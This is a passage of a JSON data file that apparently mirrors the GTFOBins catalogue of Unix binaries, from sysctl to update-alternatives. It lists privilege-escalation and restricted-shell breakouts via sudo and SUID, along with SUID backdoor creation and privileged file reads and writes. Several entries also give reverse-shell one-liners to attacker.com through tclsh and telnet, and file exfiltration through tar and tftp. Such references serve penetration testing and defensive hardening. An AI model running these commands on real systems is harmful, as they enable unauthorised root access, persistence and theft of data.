        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo su"
      }
    ]
  },
  {
    "id": 268,
    "bin": "sysctl",
    "url": "/gtfobins/sysctl/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\n/usr/sbin/sysctl -n \"/../../$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which sysctl) .\n\nLFILE=file_to_read\n./sysctl -n \"/../../$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo sysctl -n \"/../../$LFILE\""
      }
    ]
  },
  {
    "id": 269,
    "bin": "systemctl",
    "url": "/gtfobins/systemctl/",
    "funcs": [
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which systemctl) .\n\nTF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\n./systemctl link $TF\n./systemctl enable --now $TF\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nTF=$(mktemp)\necho /bin/sh >$TF\nchmod +x $TF\nsudo SYSTEMD_EDITOR=$TF systemctl edit system.slice\n\n\nTF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\nsudo systemctl link $TF\nsudo systemctl enable --now $TF\n\n\nThis invokes the default pager, which is likely to be less, other functions may apply.\nsudo systemctl\n!sh"
      }
    ]
  },
  {
    "id": 270,
    "bin": "systemd-resolve",
    "url": "/gtfobins/systemd-resolve/",
    "funcs": [
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nThis invokes the default pager, which is likely to be less, other functions may apply.\nsudo systemd-resolve --status\n!sh"
      }
    ]
  },
  {
    "id": 271,
    "bin": "tac",
    "url": "/gtfobins/tac/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\ntac -s 'RANDOM' \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which tac) .\n\nLFILE=file_to_read\n./tac -s 'RANDOM' \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo tac -s 'RANDOM' \"$LFILE\""
      }
    ]
  },
  {
    "id": 272,
    "bin": "tail",
    "url": "/gtfobins/tail/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\ntail -c1G \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which tail) .\n\nLFILE=file_to_read\n./tail -c1G \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo tail -c1G \"$LFILE\""
      }
    ]
  },
  {
    "id": 273,
    "bin": "tar",
    "url": "/gtfobins/tar/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\ntar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh\n\n\nThis only works for GNU tar.\ntar xf /dev/null -I '/bin/sh -c \"sh <&2 1>&2\"'\n\n\nThis only works for GNU tar. It can be useful when only a limited command argument injection is available.\nTF=$(mktemp)\necho '/bin/sh 0<&1' > \"$TF\"\ntar cf \"$TF.tar\" \"$TF\"\ntar xf \"$TF.tar\" --to-command sh\nrm \"$TF\"*\n\n"
      },
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nThis only works for GNU tar. Create tar archive and send it via SSH to a remote location. The attacker box must have the rmt utility installed (it should be present by default in Debian-like distributions).\nRHOST=attacker.com\nRUSER=root\nRFILE=/tmp/file_to_send.tar\nLFILE=file_to_send\ntar cvf $RUSER@$RHOST:$RFILE $LFILE --rsh-command=/bin/ssh\n\n"
      },
      {
        "func": "File download",
        "man": "It can download remote files.\n\n\nThis only works for GNU tar. Download and extract a tar archive via SSH. The attacker box must have the rmt utility installed (it should be present by default in Debian-like distributions).\nRHOST=attacker.com\nRUSER=root\nRFILE=/tmp/file_to_get.tar\ntar xvf $RUSER@$RHOST:$RFILE --rsh-command=/bin/ssh\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nThis only works for GNU tar.\nLFILE=file_to_write\nTF=$(mktemp)\necho DATA > \"$TF\"\ntar c --xform \"s@.*@$LFILE@\" -OP \"$TF\" | tar x -P\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nThis only works for GNU tar.\nLFILE=file_to_read\ntar xf \"$LFILE\" -I '/bin/sh -c \"cat 1>&2\"'\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which tar) .\n\n./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
      }
    ]
  },
  {
    "id": 274,
    "bin": "task",
    "url": "/gtfobins/task/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\ntask execute /bin/sh\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo task execute /bin/sh"
      }
    ]
  },
  {
    "id": 275,
    "bin": "taskset",
    "url": "/gtfobins/taskset/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\ntaskset 1 /bin/sh\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which taskset) .\n\n./taskset 1 /bin/sh -p\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo taskset 1 /bin/sh"
      }
    ]
  },
  {
    "id": 276,
    "bin": "tasksh",
    "url": "/gtfobins/tasksh/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\ntasksh\n!/bin/sh\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo tasksh\n!/bin/sh\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which tasksh) .\n\n./tasksh\n!/bin/sh"
      }
    ]
  },
  {
    "id": 277,
    "bin": "tbl",
    "url": "/gtfobins/tbl/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\ntbl $LFILE\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which tbl) .\n\nLFILE=file_to_read\n./tbl $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo tbl $LFILE"
      }
    ]
  },
  {
    "id": 278,
    "bin": "tclsh",
    "url": "/gtfobins/tclsh/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\ntclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr\n\n"
      },
      {
        "func": "Non-interactive reverse shell",
        "man": "It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.\n\n\nRun nc -l -p 12345 on the attacker box to receive the shell.\nexport RHOST=attacker.com\nexport RPORT=12345\necho 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s \"> \";flush $s;gets $s c;set e \"exec $c\";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which tclsh) .\n\n./tclsh\nexec /bin/sh -p <@stdin >@stdout 2>@stderr\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr"
      }
    ]
  },
  {
    "id": 279,
    "bin": "tcpdump",
    "url": "/gtfobins/tcpdump/",
    "funcs": [
      {
        "func": "Command",
        "man": "It can be used to break out from restricted environments by running non-interactive system commands.\n\n\nCOMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\ntcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nCOMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root"
      }
    ]
  },
  {
    "id": 280,
    "bin": "tee",
    "url": "/gtfobins/tee/",
    "funcs": [
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nLFILE=file_to_write\necho DATA | ./tee -a \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which tee) .\n\nLFILE=file_to_write\necho DATA | ./tee -a \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_write\necho DATA | sudo tee -a \"$LFILE\""
      }
    ]
  },
  {
    "id": 281,
    "bin": "telnet",
    "url": "/gtfobins/telnet/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nBSD version only. Needs to be connected first.\nRHOST=attacker.com\nRPORT=12345\ntelnet $RHOST $RPORT\n^]\n!/bin/sh\n\n"
      },
      {
        "func": "Reverse shell",
        "man": "It can send back a reverse shell to a listening attacker to open a remote network access.\n\n\nRun nc -l -p 12345 on the attacker box to receive the shell.\nRHOST=attacker.com\nRPORT=12345\nTF=$(mktemp -u)\nmkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nBSD version only. Needs to be connected first.\nRHOST=attacker.com\nRPORT=12345\nsudo telnet $RHOST $RPORT\n^]\n!/bin/sh\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nBSD version only. Needs to be connected first.\nsudo install -m =xs $(which telnet) .\n\nRHOST=attacker.com\nRPORT=12345\n./telnet $RHOST $RPORT\n^]\n!/bin/sh"
      }
    ]
  },
  {
    "id": 282,
    "bin": "tex",
    "url": "/gtfobins/tex/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\ntex --shell-escape '\\write18{/bin/sh}\\end'\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo tex --shell-escape '\\write18{/bin/sh}\\end'\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which tex) .\n\n./tex --shell-escape '\\write18{/bin/sh}\\end'"
      }
    ]
  },
  {
    "id": 283,
    "bin": "tftp",
    "url": "/gtfobins/tftp/",
    "funcs": [
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nSend local file to a TFTP server.\nRHOST=attacker.com\ntftp $RHOST\nput file_to_send\n\n"
      },
      {
        "func": "File download",
        "man": "It can download remote files.\n\n\nFetch a remote file from a TFTP server.\nRHOST=attacker.com\ntftp $RHOST\nget file_to_get\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nSend local file to a TFTP server.\nsudo install -m =xs $(which tftp) .\n\nRHOST=attacker.com\n./tftp $RHOST\nput file_to_send\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nSend local file to a TFTP server.\nRHOST=attacker.com\nsudo tftp $RHOST\nput file_to_send"
      }
    ]
  },
  {
    "id": 284,
    "bin": "tic",
    "url": "/gtfobins/tic/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\ntic -C \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which tic) .\n\nLFILE=file_to_read\n./tic -C \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo tic -C \"$LFILE\""
      }
    ]
  },
  {
    "id": 285,
    "bin": "time",
    "url": "/gtfobins/time/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\n/usr/bin/time /bin/sh\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which time) .\n\n./time /bin/sh -p\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo /usr/bin/time /bin/sh"
      }
    ]
  },
  {
    "id": 286,
    "bin": "timedatectl",
    "url": "/gtfobins/timedatectl/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\ntimedatectl list-timezones\n!/bin/sh\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo timedatectl list-timezones\n!/bin/sh"
      }
    ]
  },
  {
    "id": 287,
    "bin": "timeout",
    "url": "/gtfobins/timeout/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\ntimeout 7d /bin/sh\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which timeout) .\n\n./timeout 7d /bin/sh -p\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo timeout --foreground 7d /bin/sh"
      }
    ]
  },
  {
    "id": 288,
    "bin": "tmate",
    "url": "/gtfobins/tmate/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\ntmate -c /bin/sh\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo tmate -c /bin/sh\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which tmate) .\n\n./tmate -c /bin/sh"
      }
    ]
  },
  {
    "id": 289,
    "bin": "tmux",
    "url": "/gtfobins/tmux/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\ntmux\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nThe file is read and parsed as a tmux configuration file, part of the first invalid line is returned in an error message.\nLFILE=file_to_read\ntmux -f $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo tmux"
      }
    ]
  },
  {
    "id": 290,
    "bin": "top",
    "url": "/gtfobins/top/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\necho -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc\ntop\n# press return twice\nreset\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nThis requires that the root configuration file is writable and might be used to persist elevated privileges.\necho -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc\nsudo top\n# press return twice\nreset"
      }
    ]
  },
  {
    "id": 291,
    "bin": "troff",
    "url": "/gtfobins/troff/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\ntroff $LFILE\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which troff) .\n\nLFILE=file_to_read\n./troff $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo troff $LFILE"
      }
    ]
  },
  {
    "id": 292,
    "bin": "tshark",
    "url": "/gtfobins/tshark/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nTF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' >$TF\ntshark -Xlua_script:$TF"
      }
    ]
  },
  {
    "id": 293,
    "bin": "ul",
    "url": "/gtfobins/ul/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nul \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which ul) .\n\nLFILE=file_to_read\n./ul \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo ul \"$LFILE\""
      }
    ]
  },
  {
    "id": 294,
    "bin": "unexpand",
    "url": "/gtfobins/unexpand/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nunexpand -t99999999 \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which unexpand) .\n\nLFILE=file_to_read\n./unexpand -t99999999 \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo unexpand -t99999999 \"$LFILE\""
      }
    ]
  },
  {
    "id": 295,
    "bin": "uniq",
    "url": "/gtfobins/uniq/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nuniq \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which uniq) .\n\nLFILE=file_to_read\n./uniq \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo uniq \"$LFILE\""
      }
    ]
  },
  {
    "id": 296,
    "bin": "unshare",
    "url": "/gtfobins/unshare/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nunshare /bin/sh\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which unshare) .\n\n./unshare -r /bin/sh\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo unshare /bin/sh"
      }
    ]
  },
  {
    "id": 297,
    "bin": "unzip",
    "url": "/gtfobins/unzip/",
    "funcs": [
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which unzip) .\n\n./unzip -K shell.zip\n./sh -p\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo unzip -K shell.zip\n./sh -p"
      }
    ]
  },
  {
    "id": 298,
    "bin": "update-alternatives",
    "url": "/gtfobins/update-alternatives/",
    "funcs": [
      {
        "func": "SUID",
